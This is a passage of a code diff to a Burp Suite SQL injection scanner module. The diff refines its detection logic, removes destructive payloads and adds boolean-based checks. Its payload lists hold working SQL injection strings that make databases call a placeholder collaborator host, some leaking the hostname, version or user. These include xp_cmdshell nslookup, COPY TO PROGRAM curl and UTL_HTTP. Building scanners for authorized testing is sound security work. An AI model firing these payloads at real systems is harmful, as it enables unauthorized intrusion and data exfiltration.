@@ -10,8 +10,10 @@ import burp.api.montoya.http.message.responses.HttpResponse;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.JsonScanSupport;
 import com.omnistrike.framework.PayloadEncoder;
 import com.omnistrike.framework.ResponseGuard;
+import com.omnistrike.framework.ScanTargetIdentity;
 import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
@@ -43,9 +45,10 @@ public class SmartSqliDetector implements ScanModule {
     // Tested parameters tracking
     private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
     // Parameters confirmed exploitable via OOB — skip all remaining phases for these
-    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
+    private final Set<String> oobConfirmedTargets = ConcurrentHashMap.newKeySet();
 
-    // DBMS fingerprint cache: URL path → detected DBMS (empty string = inconclusive)
+    // DBMS fingerprint cache: fully scoped injection target → detected DBMS
+    // (empty string = inconclusive)
     private final ConcurrentHashMap<String, String> fingerprintCache = new ConcurrentHashMap<>();
     private final ConcurrentHashMap<String, CountDownLatch> fingerprintLatches = new ConcurrentHashMap<>();
 
@@ -151,31 +154,28 @@ public class SmartSqliDetector implements ScanModule {
         Map<String, String[]> oob = new LinkedHashMap<>();
         oob.put("MySQL", new String[]{
                 // LOAD_FILE with UNC path — single-quote string context
-                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
-                "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
+                "' AND LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                 // Double-quote context
-                "\" UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
-                "\" AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                "\" UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
+                "\" AND LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                 // Data exfil: version + user in subdomain
-                "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,COLLAB_PLACEHOLDER,0x5c5c61))-- -",
-                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
-                // INTO OUTFILE/DUMPFILE via UNC
-                "' UNION SELECT 'test' INTO OUTFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
-                "' UNION SELECT 'test' INTO DUMPFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
+                "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,'COLLAB_PLACEHOLDER',0x5c5c61))-- -",
+                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                 // LOAD_FILE via hex-encoded path (WAF bypass)
-                "' UNION SELECT LOAD_FILE(0x5c5c5c5cCOLLAB_PLACEHOLDER5c61)-- -",
-                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),COLLAB_PLACEHOLDER,CHAR(92,97)))-- -",
+                "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'COLLAB_PLACEHOLDER',0x5c61))-- -",
+                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),'COLLAB_PLACEHOLDER',CHAR(92,97)))-- -",
                 // XML error functions wrapping LOAD_FILE
-                "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))))-- -",
-                "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))),1)-- -",
+                "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a')))))-- -",
+                "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a')))),1)-- -",
                 // LOAD_FILE via SET @var — avoids string concatenation detection
-                "'; SET @q=CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'); SELECT LOAD_FILE(@q)-- -",
+                "'; SET @q=CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'); SELECT LOAD_FILE(@q)-- -",
                 // Subquery-wrapped — numeric context
-                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
-                "1 OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
-                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.', COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
+                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))) IS NOT NULL-- -",
+                "1 OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))) IS NOT NULL-- -",
+                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.','COLLAB_PLACEHOLDER','\\\\a'))) IS NOT NULL-- -",
                 // Integer injection — no quotes
-                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
+                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'COLLAB_PLACEHOLDER',0x5c5c61)))",
         });
         oob.put("MSSQL", new String[]{
                 // xp_dirtree (most common, enabled by default)
@@ -199,7 +199,6 @@ public class SmartSqliDetector implements ScanModule {
                 // sp_OACreate + WScript.Shell (alternative OOB)
                 "'; DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run','','nslookup COLLAB_PLACEHOLDER'-- -",
                 // BULK INSERT from UNC path
-                "'; BULK INSERT tempdb..omni FROM '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                 // fn_get_audit_file UNC read
                 "'; SELECT * FROM sys.fn_get_audit_file('\\\\COLLAB_PLACEHOLDER\\a',DEFAULT,DEFAULT)-- -",
                 // OPENROWSET BULK UNC
@@ -207,7 +206,6 @@ public class SmartSqliDetector implements ScanModule {
                 // xp_cmdshell with data exfil (hostname in subdomain)
                 "'; EXEC xp_cmdshell 'nslookup %COMPUTERNAME%.COLLAB_PLACEHOLDER'-- -",
                 // Linked server OOB
-                "'; EXEC sp_addlinkedserver @server='\\\\COLLAB_PLACEHOLDER\\a'-- -",
                 // Subquery-wrapped — numeric context
                 "1 AND (SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')) IS NOT NULL-- -",
                 "1 AND (SELECT TOP 1 1 FROM master..sysprocesses WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
@@ -236,9 +234,7 @@ public class SmartSqliDetector implements ScanModule {
                 // DBMS_XMLGEN
                 "' UNION SELECT DBMS_XMLGEN.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL-- -",
                 // DBMS_SCHEDULER job creation with HTTP callback
-                "'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'omni',job_type=>'EXECUTABLE',job_action=>'/usr/bin/nslookup',number_of_arguments=>1,auto_drop=>TRUE);DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('omni',1,'COLLAB_PLACEHOLDER');DBMS_SCHEDULER.RUN_JOB('omni');END;-- -",
                 // UTL_FILE write to UNC (Windows Oracle)
-                "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('\\\\COLLAB_PLACEHOLDER\\a','test.txt','W');UTL_FILE.PUT_LINE(f,'test');UTL_FILE.FCLOSE(f);END;-- -",
                 // DBMS_XMLQUERY (older Oracle versions)
                 "'||(SELECT DBMS_XMLQUERY.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL)||'",
                 // UTL_HTTP with data exfil (user in path)
@@ -265,8 +261,6 @@ public class SmartSqliDetector implements ScanModule {
                 "'; COPY (SELECT '') TO PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                 "'; COPY (SELECT '') TO PROGRAM 'wget http://COLLAB_PLACEHOLDER/'-- -",
                 // COPY FROM PROGRAM (reverse direction — reads output)
-                "'; COPY omni FROM PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
-                "'; COPY omni FROM PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                 // dblink_connect (if extension installed) — string context
                 "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                 "' AND 1=(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))-- -",
@@ -300,31 +294,6 @@ public class SmartSqliDetector implements ScanModule {
                 // Subquery-wrapped — numeric context
                 "1 AND (SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')) IS NOT NULL-- -",
                 "1;ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
-        });
-        // DB-agnostic OOB via stacked queries (try common DNS/HTTP exfil for unknown DB)
-        oob.put("Generic", new String[]{
-                // MSSQL best-bet — string context
-                "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
-                // MySQL best-bet — string context
-                "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
-                // Oracle best-bet — string context
-                "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
-                // PostgreSQL best-bet — string context
-                "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
-                // dblink (PostgreSQL, works without stacked queries)
-                "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
-                // Oracle HTTP (alternative to DNS)
-                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
-                // Subquery-wrapped — numeric context (covers all DB types)
-                "1 AND (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL) IS NOT NULL-- -",
-                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
-                "1 AND (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
-                // Bare subqueries — no quotes (integer injection)
-                "(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
-                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
-                "(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))",
-                // Numeric stacked query
-                "1;EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
         });
         OOB_PAYLOADS = Collections.unmodifiableMap(oob);
     }
@@ -381,18 +350,11 @@ public class SmartSqliDetector implements ScanModule {
                 "'; BEGIN DBMS_SESSION.SLEEP(5); END;-- -",
                 "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)",
         });
-        tp.put("SQLite", new String[]{
-                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
-                "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
-                "\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
-                "' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -",
-                "' AND 1=LIKE('A',HEX(ZEROBLOB(500000000)))-- -",
-        });
+        // SQLite has no native sleep primitive. RANDOMBLOB-based substitutes
+        // allocate hundreds of MB and can DoS the database, so they are omitted.
         TIME_PAYLOADS = Collections.unmodifiableMap(tp);
     }
 
-
-    private static final String UNION_MARKER = "xXsSqLiXx";
 
     // Lightweight DBMS fingerprint probes — sent before the main payload battery
     private static final String[] FINGERPRINT_PROBES = {
@@ -443,7 +405,7 @@ public class SmartSqliDetector implements ScanModule {
         HttpRequest request = requestResponse.request();
         String urlPath = extractPath(request.url());
         List<InjectionPoint> injectionPoints = extractInjectionPoints(request);
-        injectionPoints.removeIf(ip -> !ip.name.equalsIgnoreCase(targetParameterName));
+        injectionPoints.removeIf(ip -> !ip.matchesParameterName(targetParameterName));
         return runInjectionPoints(requestResponse, injectionPoints, urlPath);
     }
 
@@ -460,14 +422,15 @@ public class SmartSqliDetector implements ScanModule {
                                               List<InjectionPoint> injectionPoints, String urlPath) {
         for (InjectionPoint ip : injectionPoints) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return Collections.emptyList();
-            String dedupKey = "sqli:" + urlPath + ":" + ip.name;
+            String dedupKey = "sqli:" + scanTargetKey(requestResponse.request(), ip);
             // Atomic mark-before-test: putIfAbsent returns null only on first caller,
             // preventing both the TOCTOU race (containsKey/put) and the retry-on-exception
             // bug (parameter retested forever if testParameter throws).
             // Manual (right-click) scans set the shared dedup bypass on this thread —
             // honor it so an explicit re-scan actually re-tests the parameter.
             boolean manualBypass = dedup != null && dedup.isBypass();
-            if (!manualBypass && tested.putIfAbsent(dedupKey, Boolean.TRUE) != null) continue;
+            if (!manualBypass
+                    && !com.omnistrike.framework.BoundedDeduplication.markIfNew(tested, dedupKey)) continue;
 
             try {
                 testParameter(requestResponse, ip, urlPath);
@@ -496,19 +459,35 @@ public class SmartSqliDetector implements ScanModule {
                 detectedDbms = fingerprintDbms(original, ip, urlPath, baselineBody);
             }
 
-            // Phase 3: OOB via Collaborator (fire-and-forget)
-            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
-                testOob(original, ip, detectedDbms);
+            boolean oobAvailable = config.getBool("sqli.oob.enabled", true)
+                    && collaboratorManager != null && collaboratorManager.isAvailable();
+
+            // Phase 3: compact OOB canary stage. Remaining variants are deferred
+            // until direct UNION and boolean checks fail.
+            if (oobAvailable) {
+                testOob(original, ip, detectedDbms, true);
             }
 
             // Phase 4: Union-based
-            if (oobConfirmedParams.contains(ip.name)) return;
+            if (isOobConfirmed(original, ip)) return;
             if (config.getBool("sqli.union.enabled", true)) {
-                testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
+                if (testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody)) return;
+            }
+
+            // Phase 4b: conservative boolean differential detection.
+            if (config.getBool("sqli.boolean.enabled", true)
+                    && testBooleanBased(original, ip, baseline)) {
+                return;
+            }
+
+            // Direct confirmation failed: finish uncommon DB-specific OOB variants.
+            if (isOobConfirmed(original, ip)) return;
+            if (oobAvailable) {
+                testOob(original, ip, detectedDbms, false);
             }
 
             // Phase 5: Time-based blind (serialized via TimingLock to avoid false positives)
-            if (oobConfirmedParams.contains(ip.name)) return;
+            if (isOobConfirmed(original, ip)) return;
             if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", false)) {
                 try {
                     TimingLock.acquire();
@@ -529,7 +508,7 @@ public class SmartSqliDetector implements ScanModule {
 
     // ==================== PHASE 3: UNION-BASED ====================
 
-    private void testUnionBased(HttpRequestResponse original, InjectionPoint ip,
+    private boolean testUnionBased(HttpRequestResponse original, InjectionPoint ip,
                                  int baselineLength, int baselineStatus, String baselineBody) {
         int maxColumns = config.getInt("sqli.union.maxColumns", 30);
         int anomalyThreshold = config.getInt("sqli.union.anomalyThreshold", 50);
@@ -537,13 +516,12 @@ public class SmartSqliDetector implements ScanModule {
         // Step 1: Detect column count via ORDER BY
         int columnCount = -1;
         String quoteChar = "'";
-        HttpRequestResponse lastOrderByResult = null;
 
         for (String q : new String[]{"'", "\"", ""}) {
-            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
             int lastGood = 0;
             for (int i = 1; i <= maxColumns; i++) {
-                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
                 try {
 
                     String payload = q.isEmpty()
@@ -561,7 +539,6 @@ public class SmartSqliDetector implements ScanModule {
 
                     if (status == baselineStatus && Math.abs(length - baselineLength) < anomalyThreshold) {
                         lastGood = i;
-                        lastOrderByResult = result;
                     } else {
                         // Response changed — previous value was the column count
                         if (lastGood > 0) {
@@ -573,13 +550,13 @@ public class SmartSqliDetector implements ScanModule {
                     perHostDelay();
                 } catch (InterruptedException e) {
                     Thread.currentThread().interrupt();
-                    return;
+                    return false;
                 }
             }
             if (columnCount > 0) break;
         }
 
-        if (columnCount <= 0) return;
+        if (columnCount <= 0) return false;
 
         // Column count detection is a prerequisite step, not a finding.
         // Only report if UNION marker exfiltration succeeds.
@@ -602,7 +579,7 @@ public class SmartSqliDetector implements ScanModule {
             HttpRequestResponse unionResult = null;
 
             for (String variant : unionVariants) {
-                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
                 String testPayload = quoteChar.isEmpty()
                         ? ip.originalValue + variant + nulls + "-- -"
                         : ip.originalValue + quoteChar + variant + nulls + "-- -";
@@ -621,16 +598,10 @@ public class SmartSqliDetector implements ScanModule {
                 perHostDelay();
             }
 
-            if (unionResult == null) return;
+            if (unionResult == null) return false;
 
             String _unionBody = unionResult.response().bodyToString();
             if (_unionBody == null) _unionBody = "";
-            int unionLength = _unionBody.length();
-            int unionStatus = unionResult.response().statusCode();
-
-            boolean anomaly = Math.abs(unionLength - baselineLength) > anomalyThreshold
-                    || unionStatus != baselineStatus;
-
             // Determine which UNION variant worked for subsequent payloads
             String workingUnion = " UNION SELECT ";
             if (unionPayload != null) {
@@ -644,12 +615,13 @@ public class SmartSqliDetector implements ScanModule {
 
             // Step 3: Find reflected column
             int reflectedColumn = -1;
+            String unionMarker = "xX" + UUID.randomUUID().toString().replace("-", "").substring(0, 16) + "Xx";
             for (int col = 0; col < columnCount; col++) {
-                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
 
                 String[] cols = new String[columnCount];
                 Arrays.fill(cols, "NULL");
-                cols[col] = "'" + UNION_MARKER + "'";
+                cols[col] = "'" + unionMarker + "'";
 
                 String markerPayload = quoteChar.isEmpty()
                         ? ip.originalValue + workingUnion + String.join(",", cols) + "-- -"
@@ -660,17 +632,19 @@ public class SmartSqliDetector implements ScanModule {
                         && ResponseGuard.isUsableResponse(markerResult)) {
                     String _markerBody = markerResult.response().bodyToString();
                     if (_markerBody == null) _markerBody = "";
-                    if (_markerBody.contains(UNION_MARKER)) {
+                    if (_markerBody.contains(unionMarker)
+                            && !baselineBody.contains(unionMarker)
+                            && !looksLikeReflectedUnionPayload(_markerBody, markerPayload, unionMarker)) {
                         reflectedColumn = col + 1;
 
                         findingsStore.addFinding(Finding.builder("sqli-detector",
                                         "SQL Injection (Union-Based) - Reflected column " + reflectedColumn,
-                                        Severity.CRITICAL, Confidence.TENTATIVE)
+                                        Severity.CRITICAL, Confidence.FIRM)
                                 .url(original.request().url())
                                 .parameter(ip.name)
-                                .evidence("Column " + reflectedColumn + " of " + columnCount + " is reflected. Marker '" + UNION_MARKER + "' found in response.")
+                                .evidence("Column " + reflectedColumn + " of " + columnCount + " is reflected. Random marker '" + unionMarker + "' found in response and not reflected from the request.")
                                 .payload(markerPayload)
-                                .responseEvidence(UNION_MARKER)
+                                .responseEvidence(unionMarker)
                                 .description("Union-based SQL injection confirmed. Column " + reflectedColumn
                                         + " is reflected in the response.")
                                 .requestResponse(markerResult)
@@ -678,7 +652,7 @@ public class SmartSqliDetector implements ScanModule {
 
                         // Step 4: DB fingerprinting
                         fingerprintDb(original, ip, columnCount, reflectedColumn, quoteChar, workingUnion);
-                        return;
+                        return true;
                     }
                 }
                 perHostDelay();
@@ -690,16 +664,98 @@ public class SmartSqliDetector implements ScanModule {
         } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
         }
+        return false;
+    }
+
+    private boolean testBooleanBased(HttpRequestResponse original, InjectionPoint ip,
+                                     HttpRequestResponse baseline) {
+        if (baseline == null || baseline.response() == null) return false;
+        HttpRequestResponse baseline2 = sendWithPayload(original, ip, ip.originalValue);
+        if (baseline2 == null || baseline2.response() == null) return false;
+
+        String baselineShape = responseShape(baseline, ip.originalValue);
+        String baselineShape2 = responseShape(baseline2, ip.originalValue);
+        if (!baselineShape.equals(baselineShape2)) {
+            api.logging().logToOutput("[SQLi] Boolean phase skipped for " + ip.name
+                    + " — baseline content is unstable");
+            return false;
+        }
+
+        String marker = UUID.randomUUID().toString().replace("-", "").substring(0, 10);
+        String[][] pairs = {
+                {ip.originalValue + "' AND '" + marker + "'='" + marker + "'-- -",
+                 ip.originalValue + "' AND '" + marker + "'='x" + marker + "'-- -"},
+                {ip.originalValue + " AND 918273=918273-- -",
+                 ip.originalValue + " AND 918273=918274-- -"},
+                {ip.originalValue + "\" AND \"" + marker + "\"=\"" + marker + "\"-- -",
+                 ip.originalValue + "\" AND \"" + marker + "\"=\"x" + marker + "\"-- -"}
+        };
+
+        for (String[] pair : pairs) {
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+            HttpRequestResponse true1 = sendWithPayload(original, ip, pair[0]);
+            HttpRequestResponse false1 = sendWithPayload(original, ip, pair[1]);
+            if (!booleanCandidate(baseline, baselineShape, true1, false1, pair)) continue;
+
+            HttpRequestResponse true2 = sendWithPayload(original, ip, pair[0]);
+            HttpRequestResponse false2 = sendWithPayload(original, ip, pair[1]);
+            if (!booleanCandidate(baseline, baselineShape, true2, false2, pair)) continue;
+            if (!responseShape(false1, pair[1]).equals(responseShape(false2, pair[1]))) continue;
+
+            findingsStore.addFinding(Finding.builder("sqli-detector",
+                            "SQL Injection (Boolean-Based Blind)", Severity.HIGH, Confidence.CERTAIN)
+                    .url(original.request().url()).parameter(ip.name)
+                    .evidence("True condition matched two stable baselines twice; false condition "
+                            + "produced a different, repeatable response twice. True payload: " + pair[0]
+                            + " | False payload: " + pair[1])
+                    .description("Boolean-based blind SQL injection confirmed through repeated "
+                            + "true/false differential responses on a stable endpoint.")
+                    .payload(pair[0])
+                    .requestResponse(false2)
+                    .build());
+            return true;
+        }
+        return false;
+    }
+
+    private static boolean booleanCandidate(HttpRequestResponse baseline, String baselineShape,
+                                             HttpRequestResponse trueResult,
+                                             HttpRequestResponse falseResult, String[] pair) {
+        if (trueResult == null || trueResult.response() == null
+                || falseResult == null || falseResult.response() == null) return false;
+        boolean trueMatches = trueResult.response().statusCode() == baseline.response().statusCode()
+                && responseShape(trueResult, pair[0]).equals(baselineShape);
+        boolean falseDiffers = falseResult.response().statusCode() != baseline.response().statusCode()
+                || !responseShape(falseResult, pair[1]).equals(baselineShape);
+        return trueMatches && falseDiffers;
+    }
+
+    static String responseShape(HttpRequestResponse result, String reflectedPayload) {
+        if (result == null || result.response() == null) return "";
+        String body = result.response().bodyToString();
+        if (body == null) body = "";
+        if (reflectedPayload != null && !reflectedPayload.isEmpty()) {
+            body = body.replace(reflectedPayload, "");
+        }
+        return body
+                .replaceAll("(?i)[0-9a-f]{8}-[0-9a-f-]{27,}", "<uuid>")
+                .replaceAll("\\b\\d{4,}\\b", "<number>")
+                .replaceAll("\\s+", " ")
+                .trim();
+    }
+
+    static boolean looksLikeReflectedUnionPayload(String body, String payload, String marker) {
+        if (body.contains(payload)) return true;
+        int markerAt = body.indexOf(marker);
+        if (markerAt < 0) return false;
+        int start = Math.max(0, markerAt - 200);
+        int end = Math.min(body.length(), markerAt + marker.length() + 200);
+        String window = body.substring(start, end).toLowerCase(Locale.ROOT);
+        return window.contains("union") && window.contains("select");
     }
 
     private void fingerprintDb(HttpRequestResponse original, InjectionPoint ip,
                                 int columnCount, int reflectedCol, String quoteChar, String unionVariant) {
-        // Get baseline for comparison
-        HttpRequestResponse baselineResult = sendWithPayload(original, ip, ip.originalValue);
-        String baselineBody = (baselineResult != null && baselineResult.response() != null)
-                ? baselineResult.response().bodyToString() : "";
-        if (baselineBody == null) baselineBody = "";
-        int baselineLength = baselineBody.length();
         String[][] dbProbes = {
                 {"MySQL", "version()"},
                 {"MySQL", "database()"},
@@ -746,9 +802,8 @@ public class SmartSqliDetector implements ScanModule {
                         && ResponseGuard.isUsableResponse(result)) {
                     String body = result.response().bodyToString();
                     if (body == null) body = "";
-                    // Look for DB-specific version strings — NOT generic x.y.z which matches
-                    // JS libraries, CSS frameworks, etc. Only match if we see the UNION_MARKER
-                    // was consumed (marker NOT in response = UNION worked) AND version-like data appeared.
+                    // Look only for DB-specific version strings — generic response changes
+                    // cannot identify which engine evaluated a shared SQL expression.
                     boolean hasDbVersion = body.contains("MariaDB")
                             || body.contains("PostgreSQL")
                             || body.contains("Microsoft SQL Server")
@@ -758,11 +813,7 @@ public class SmartSqliDetector implements ScanModule {
                             || body.contains("CockroachDB")
                             || body.contains("DB2")
                             || body.contains("Firebird");
-                    // Also accept if the probe value itself appears (e.g., database() returns "mydb")
-                    // but only if the response differs from baseline body
-                    boolean responseChanged = !body.equals(baselineBody)
-                            && Math.abs(body.length() - baselineLength) > 20;
-                    if (hasDbVersion || (responseChanged && !body.contains(UNION_MARKER))) {
+                    if (hasDbVersion) {
                         // DB fingerprinting is informational context, not a standalone finding.
                         // The UNION injection itself was already reported as CRITICAL.
                         findingsStore.addFinding(Finding.builder("sqli-detector",
@@ -828,6 +879,7 @@ public class SmartSqliDetector implements ScanModule {
             }
             for (String payload : entry.getValue()) {
                 if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (isOobConfirmed(original, ip)) return;
                 try {
                     // Step 1: Send true-condition delay payload
                     TimedResult result1 = measureResponseTime(original, ip, payload);
@@ -939,7 +991,8 @@ public class SmartSqliDetector implements ScanModule {
 
     // ==================== PHASE 6: OOB VIA COLLABORATOR ====================
 
-    private void testOob(HttpRequestResponse original, InjectionPoint ip, String detectedDbms) {
+    private void testOob(HttpRequestResponse original, InjectionPoint ip, String detectedDbms,
+                         boolean fastStage) {
         String url = original.request().url();
 
         for (Map.Entry<String, String[]> entry : OOB_PAYLOADS.entrySet()) {
@@ -947,14 +1000,20 @@ public class SmartSqliDetector implements ScanModule {
             String dbType = entry.getKey();
 
             // DBMS filtering: if fingerprint identified a DBMS, skip OOB payloads for other DBMSes
-            if (detectedDbms != null && !dbType.equals("Generic") && !dbType.equals(detectedDbms)) {
+            if (detectedDbms != null && !dbType.equals(detectedDbms)) {
                 continue;
             }
-            for (String payloadTemplate : entry.getValue()) {
+            String[] templates = entry.getValue();
+            for (int payloadIndex = 0; payloadIndex < templates.length; payloadIndex++) {
                 if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (isOobConfirmed(original, ip)) return;
+                if ((payloadIndex < 2) != fastStage) continue;
+                String payloadTemplate = templates[payloadIndex];
+                if (!isNonDestructiveOobPayload(payloadTemplate)) continue;
                 try {
                     // AtomicReference to capture the sent request/response for the finding
                     AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+                    AtomicReference<String> sentPayload = new AtomicReference<>();
 
                     // Generate unique Collaborator payload for this test
                     String collabPayload = collaboratorManager.generatePayload(
@@ -969,7 +1028,7 @@ public class SmartSqliDetector implements ScanModule {
                                 }
                                 // Mark parameter as confirmed — skip all remaining phases (HTTP only, DNS continues scanning)
                                 if (interaction.type() == InteractionType.HTTP) {
-                                    oobConfirmedParams.add(ip.name);
+                                    oobConfirmedTargets.add(scanTargetKey(original.request(), ip));
                                 }
                                 findingsStore.addFinding(Finding.builder("sqli-detector",
                                                 "SQL Injection (Out-of-Band) - " + dbType,
@@ -981,7 +1040,7 @@ public class SmartSqliDetector implements ScanModule {
                                                 + " interaction received from " + interaction.clientIp()
                                                 + " at " + interaction.timeStamp()
                                                 + " | DB type: " + dbType)
-                                        .payload(payloadTemplate)
+                                        .payload(sentPayload.get())
                                         .description("Out-of-band SQL injection confirmed via Burp Collaborator. "
                                                 + "The server made a " + interaction.type().name()
                                                 + " request to the Collaborator server, proving code execution "
@@ -996,7 +1055,9 @@ public class SmartSqliDetector implements ScanModule {
                     if (collabPayload == null) continue;
 
                     // Replace placeholder with actual Collaborator domain (DNS-aware for Custom OOB)
-                    String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
